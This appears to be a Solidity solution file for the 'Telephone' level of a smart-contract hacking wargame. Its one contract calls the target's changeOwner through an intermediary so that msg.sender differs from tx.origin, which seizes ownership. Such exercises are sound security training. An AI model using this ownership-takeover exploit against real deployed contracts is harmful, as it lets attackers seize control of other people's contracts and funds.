// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./lvl_04_Telephone.sol";

contract TelephoneAttack {
    function TelephoneChangeOwner(address _telephoneAddress) public {
        Telephone telephone = Telephone(_telephoneAddress);
        telephone.changeOwner(tx.origin);
    }
}
